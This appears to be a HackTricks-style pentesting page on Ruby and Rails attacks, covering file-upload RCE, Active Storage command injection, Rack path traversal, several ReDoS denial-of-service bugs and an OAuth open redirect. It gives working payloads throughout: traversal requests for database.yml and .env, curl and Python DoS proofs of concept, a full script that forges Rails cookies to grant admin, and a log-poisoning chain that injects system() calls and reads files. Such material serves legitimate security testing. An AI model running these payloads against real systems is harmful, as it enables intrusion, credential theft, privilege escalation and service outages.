_body: "# Ruby Tricks\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## File upload to RCE\n\nAs explained in [this\
  \ article](https://www.offsec.com/blog/cve-2024-46986/), uploading a `.rb` file into sensitive directories such as `config/initializers/`\
  \ can lead to remote code execution (RCE) in Ruby on Rails applications.\n\nTips:\n- Other boot/eager-load locations that\
  \ are executed on app start are also risky when writeable (e.g., `config/initializers/` is the classic one). If you find\
  \ an arbitrary file upload that lands anywhere under `config/` and is later evaluated/required, you may obtain RCE at boot.\n\
  - Look for dev/staging builds that copy user-controlled files into the container image where Rails will load them on boot.\n\
  \n## Active Storage image transformation → command execution (CVE-2025-24293)\n\nWhen an application uses Active Storage\
  \ with `image_processing` + `mini_magick`, and passes untrusted parameters to image transformation methods, Rails versions\
  \ prior to 7.1.5.2 / 7.2.2.2 / 8.0.2.1 could allow command injection because some transformation methods were mistakenly\
  \ allowed by default.\n\n- A vulnerable pattern looks like:\n  ```erb\n  <%= image_tag blob.variant(params[:t] => params[:v])\
  \ %>\n  ```\n  where `params[:t]` and/or `params[:v]` are attacker-controlled.\n\n- What to try during testing\n  - Identify\
  \ any endpoints that accept variant/processing options, transformation names, or arbitrary ImageMagick arguments.\n  - Fuzz\
  \ `params[:t]` and `params[:v]` for suspicious errors or execution side-effects. If you can influence the method name or\
  \ pass raw arguments that reach MiniMagick, you may get code exec on the image processor host.\n  - If you only have read-access\
  \ to generated variants, attempt blind exfiltration via crafted ImageMagick operations.\n\n- Remediation/detections\n  -\
  \ If you see Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 with Active Storage + `image_processing` + `mini_magick` and user-controlled\
  \ transformations, consider it exploitable. Recommend upgrading and enforcing strict allowlists for methods/params and a\
  \ hardened ImageMagick policy.\n\n## Rack::Static LFI / path traversal (CVE-2025-27610)\n\nIf the target stack uses Rack\
  \ middleware directly or via frameworks, versions of `rack` prior to 2.2.13, 3.0.14, and 3.1.12 allow Local File Inclusion\
  \ via `Rack::Static` when `:root` is unset/misconfigured. Encoded traversal in `PATH_INFO` can expose files under the process\
  \ working directory or an unexpected root.\n\n- Hunt for apps that mount `Rack::Static` in `config.ru` or middleware stacks.\
  \ Try encoded traversals against static paths, for example:\n  ```text\n  GET /assets/%2e%2e/%2e%2e/config/database.yml\n\
  \  GET /favicon.ico/..%2f..%2f.env\n  ```\n  Adjust the prefix to match configured `urls:`. If the app responds with file\
  \ contents, you likely have LFI to anything under the resolved `:root`.\n\n- Mitigation: upgrade Rack; ensure `:root` only\
  \ points to a directory of public files and is explicitly set.\n\n## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)\n\
  \nRack < `3.0.9.1` and < `2.2.8.1` spent super-linear time parsing crafted `Content-Type: multipart/form-data` headers.\
  \ A single POST with a gigantic `A=` parameter list can peg a Puma/Unicorn worker and cause DoS or request queue starvation.\n\
  \n- Quick PoC (will hang one worker):\n  ```bash\n  python - <<'PY'\nimport requests\nh = {'Content-Type': 'multipart/form-data;\
  \ ' + 'A='*5000}\nrequests.post('http://target/', data='x', headers=h)\nPY\n  ```\n- Works against any Rack-based stack\
  \ (Rails/Sinatra/Hanami/Grape). If fronted by nginx/haproxy with keep-alive, repeat in parallel to exhaust workers.\n- Patched\
  \ by making parser linear; look for `rack` gem version < `3.0.9.1` or < `2.2.8.1`. In assessments, point out that WAFs rarely\
  \ block this because the header is syntactically valid.\n\n## REXML XML parser ReDoS (CVE-2024-49761)\n\nThe REXML gem <\
  \ 3.3.9 (Ruby 3.1 and earlier) catastrophically backtracks when parsing hex numeric character references containing long\
  \ digit runs (e.g., `&#1111111111111x41;`). Any XML processed by REXML or libraries that wrap it (SOAP/XML API clients,\
  \ SAML, SVG uploads) can be abused for CPU exhaustion.\n\nMinimal trigger against a Rails endpoint that parses XML:\n```bash\n\
  curl -X POST http://target/xml -H 'Content-Type: application/xml' \\\n  --data '<?xml version=\"1.0\"?><r>&#11111111111111111111111111x41;</r>'\n\
  ```\nIf the process stays busy for seconds and worker CPU spikes, it is likely vulnerable. Attack is low bandwidth and affects\
  \ background jobs that ingest XML as well.\n\n## CGI cookie parsing / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)\n\
  \nApps using the `cgi` gem (default in many Rack stacks) can be frozen with a single malicious header:\n- `CGI::Cookie.parse`\
  \ was super-linear; huge cookie strings (thousands of delimiters) trigger O(N²) behavior.\n- `CGI::Util#escapeElement` regex\
  \ allowed ReDoS on HTML escaping.\n\nBoth issues are fixed in `cgi` 0.3.5.1 / 0.3.7 / 0.4.2. For pentests, drop a massive\
  \ `Cookie:` header or feed untrusted HTML to helper code and watch for worker lockup. Combine with keep-alive to amplify.\n\
  \n## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)\n\nThe `googlesign_in` gem < 1.3.0 (used\
  \ for Google OAuth on Rails) performed an incomplete same-origin check on the `proceedto` parameter. A malformed URL like\
  \ `proceedto=//attacker.com/%2F..` bypasses the check and redirects the user off-site while preserving Rails flash/session\
  \ cookies.\n\nExploit flow:\n1. Victim clicks crafted Google Sign-In link hosted by attacker.\n2. After authentication,\
  \ the gem redirects to attacker-controlled domain, leaking flash notices or any data stored in cookies scoped to the wildcard\
  \ domain.\n3. If the app stores short-lived tokens or magic links in flash, this can be turned into account takeover.\n\n\
  During testing, grep Gemfile.lock for `googlesign_in` < 1.3.0 and try malformed `proceedto` values. Confirm via Location\
  \ header and cookie reflection.\n\n## Forging/decrypting Rails cookies when `secret_key_base` is leaked\n\nRails encrypts\
  \ and signs cookies using keys derived from `secret_key_base`. If that value leaks (e.g., in a repo, logs, or misconfigured\
  \ credentials), you can usually decrypt, modify, and re-encrypt cookies. This often leads to authz bypass if the app stores\
  \ roles, user IDs, or feature flags in cookies.\n\nMinimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default\
  \ in recent Rails):\n\n<details>\n<summary>Ruby to decrypt/forge cookies</summary>\n\n```ruby\nrequire 'cgi'\nrequire 'json'\n\
  require 'active_support'\nrequire 'active_support/message_encryptor'\nrequire 'active_support/key_generator'\n\nsecret_key_base\
  \ = ENV.fetch('SECRET_KEY_BASE_LEAKED')\nraw_cookie = CGI.unescape(ARGV[0])\n\nsalt   = 'authenticated encrypted cookie'\n\
  cipher = 'aes-256-gcm'\nkey_len = ActiveSupport::MessageEncryptor.key_len(cipher)\nsecret  = ActiveSupport::KeyGenerator.new(secret_key_base,\
  \ iterations: 1000).generate_key(salt, key_len)\nenc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer:\
  \ JSON)\n\nplain = enc.decrypt_and_verify(raw_cookie)\nputs \"Decrypted: #{plain.inspect}\"\n\n# Modify and re-encrypt (example:\
  \ escalate role)\nplain['role'] = 'admin' if plain.is_a?(Hash)\nforged = enc.encrypt_and_sign(plain)\nputs \"Forged cookie:\
  \ #{CGI.escape(forged)}\"\n```\n\n</details>\nNotes:\n- Older apps may use AES-256-CBC and salts `encrypted cookie` / `signed\
  \ encrypted cookie`, or JSON/Marshal serializers. Adjust salts, cipher, and serializer accordingly.\n- On compromise/assessment,\
  \ rotate `secret_key_base` to invalidate all existing cookies.\n\n## See also (Ruby/Rails-specific vulns)\n\n- Ruby deserialization\
  \ and class pollution:\n  {{#ref}}\n  ../../pentesting-web/deserialization/README.md\n  {{#endref}}\n  {{#ref}}\n  ../../pentesting-web/deserialization/ruby-class-pollution.md\n\

  \  {{#endref}}\n\n\n## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling\n\nWhen an app (often a simple\
  \ Rack/Sinatra/Rails endpoint) both:\n- logs a user-controlled string verbatim, and\n- later `load`s a file whose path is\
  \ derived from that same string (after `Pathname#cleanpath`),\n\nYou can often achieve remote code execution by poisoning\
  \ the log and then coercing the app to `load` the log file. Key primitives:\n\n- Ruby `load` evaluates the target file content\
  \ as Ruby regardless of file extension. Any readable text file whose contents parse as Ruby will be executed.\n- `Pathname#cleanpath`\
  \ collapses `.` and `..` segments without hitting the filesystem, enabling path smuggling: attacker-controlled junk can\
  \ be prepended for logging while the cleaned path still resolves to the intended file to execute (e.g., `../logs/error.log`).\n\
  \n### Minimal vulnerable pattern\n\n```ruby\nrequire 'logger'\nrequire 'pathname'\n\nlogger   = Logger.new('logs/error.log')\n\
  param    = CGI.unescape(params[:script])\npath_obj = Pathname.new(param)\n\nlogger.info(\"Running backup script #{param}\"\
  )            # Raw log of user input\nload \"scripts/#{path_obj.cleanpath}\"                     # Executes file after cleanpath\n\
  ```\n\n### Why the log can contain valid Ruby\n`Logger` writes prefix lines like:\n```\nI, [9/2/2025 #209384]  INFO -- :\
  \ Running backup script <USER_INPUT>\n```\nIn Ruby, `#` starts a comment and `9/2/2025` is just arithmetic. To inject valid\
  \ Ruby code you need to:\n- Begin your payload on a new line so it is not commented out by the `#` in the INFO line; send\
  \ a leading newline (`\\n` or `%0A`).\n- Close the dangling `[` introduced by the INFO line. A common trick is to start\
  \ with `]` and optionally make the parser happy with `][0]=1`.\n- Then place arbitrary Ruby (e.g., `system(...)`).\n\nExample\
  \ of what will end up in the log after one request with a crafted param:\n```\nI, [9/2/2025 #209384]  INFO -- : Running\
  \ backup script\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log\n```\n\n### Smuggling a single string\
  \ that both logs code and resolves to the log path\nWe want one attacker-controlled string that:\n- when logged raw, contains\
  \ our Ruby payload, and\n- when passed through `Pathname.new(<input>).cleanpath`, resolves to `../logs/error.log` so the\
  \ subsequent `load` executes the just-poisoned log file.\n\n`Pathname#cleanpath` ignores schemes and collapses traversal\
  \ components, so the following works:\n```ruby\nrequire 'pathname'\n\np = Pathname.new(\"\\n][0]=1;system(\\\"touch /tmp/pwned\\\
  \")#://../../../../logs/error.log\")\nputs p.cleanpath   # => ../logs/error.log\n```\n- The `#` before `://` ensures Ruby\
  \ ignores the tail when the log is executed, while `cleanpath` still reduces the suffix to `../logs/error.log`.\n- The leading\
  \ newline breaks out of the INFO line; `]` closes the dangling bracket; `][0]=1` satisfies the parser.\n\n### End-to-end\
  \ exploitation\n1. Send the following as the backup script name (URL-encode the first newline as `%0A` if needed):\n   ```\n\
  \   \\n][0]=1;system(\"id > /tmp/pwned\")#://../../../../logs/error.log\n   ```\n2. The app logs your raw string into `logs/error.log`.\n\
  3. The app computes `cleanpath` which resolves to `../logs/error.log` and calls `load` on it.\n4. Ruby executes the code\
  \ you injected in the log.\n\nTo exfiltrate a file in a CTF-like environment:\n```\n\\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts\
  \ c#://../../../../logs/error.log\n```\nURL-encoded PoC (first char is a newline):\n```\n%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log\n\
